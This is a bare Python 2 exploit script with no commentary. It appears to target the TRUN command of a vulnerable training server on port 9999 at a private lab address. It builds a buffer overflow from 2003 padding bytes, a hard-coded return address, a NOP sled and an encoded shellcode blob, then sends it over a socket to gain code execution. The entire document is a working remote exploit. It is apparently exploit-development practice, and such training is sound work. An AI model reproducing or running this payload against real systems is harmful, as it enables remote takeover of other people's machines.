#!/usr/bin/python
import sys, socket

overflow = (
"\xb8\x2a\x47\x81\x36\xda\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x45\x12\x83\xc5\x04\x03\x6f\x49\x63\xc3\x93\xbd\xe1"
"\x2c\x6b\x3e\x86\xa5\x8e\x0f\x86\xd2\xdb\x20\x36\x90\x89\xcc"
"\xbd\xf4\x39\x46\xb3\xd0\x4e\xef\x7e\x07\x61\xf0\xd3\x7b\xe0"
"\x72\x2e\xa8\xc2\x4b\xe1\xbd\x03\x8b\x1c\x4f\x51\x44\x6a\xe2"
"\x45\xe1\x26\x3f\xee\xb9\xa7\x47\x13\x09\xc9\x66\x82\x01\x90"
"\xa8\x25\xc5\xa8\xe0\x3d\x0a\x94\xbb\xb6\xf8\x62\x3a\x1e\x31"
"\x8a\x91\x5f\xfd\x79\xeb\x98\x3a\x62\x9e\xd0\x38\x1f\x99\x27"
"\x42\xfb\x2c\xb3\xe4\x88\x97\x1f\x14\x5c\x41\xd4\x1a\x29\x05"
"\xb2\x3e\xac\xca\xc9\x3b\x25\xed\x1d\xca\x7d\xca\xb9\x96\x26"
"\x73\x98\x72\x88\x8c\xfa\xdc\x75\x29\x71\xf0\x62\x40\xd8\x9d"
"\x47\x69\xe2\x5d\xc0\xfa\x91\x6f\x4f\x51\x3d\xdc\x18\x7f\xba"
"\x23\x33\xc7\x54\xda\xbc\x38\x7d\x19\xe8\x68\x15\x88\x91\xe2"
"\xe5\x35\x44\xa4\xb5\x99\x37\x05\x65\x5a\xe8\xed\x6f\x55\xd7"
"\x0e\x90\xbf\x70\xa4\x6b\x28\xbf\x91\x4d\x28\x57\xe0\xb1\x39"
"\xf4\x6d\x57\x53\x14\x38\xc0\xcc\x8d\x61\x9a\x6d\x51\xbc\xe7"
"\xae\xd9\x33\x18\x60\x2a\x39\x0a\x15\xda\x74\x70\xb0\xe5\xa2"
"\x1c\x5e\x77\x29\xdc\x29\x64\xe6\x8b\x7e\x5a\xff\x59\x93\xc5"
"\xa9\x7f\x6e\x93\x92\x3b\xb5\x60\x1c\xc2\x38\xdc\x3a\xd4\x84"
"\xdd\x06\x80\x58\x88\xd0\x7e\x1f\x62\x93\x28\xc9\xd9\x7d\xbc"
"\x8c\x11\xbe\xba\x90\x7f\x48\x22\x20\xd6\x0d\x5d\x8d\xbe\x99"
"\x26\xf3\x5e\x65\xfd\xb7\x6f\x2c\x5f\x91\xe7\xe9\x0a\xa3\x65"
"\x0a\xe1\xe0\x93\x89\x03\x99\x67\x91\x66\x9c\x2c\x15\x9b\xec"
"\x3d\xf0\x9b\x43\x3d\xd1")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow #little endian format

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.62.130",9999))
	s.send(("TRUN /.:/" + shellcode))
	s.close()
		
except:
	print "Error connecting to the server"
	sys.exit()
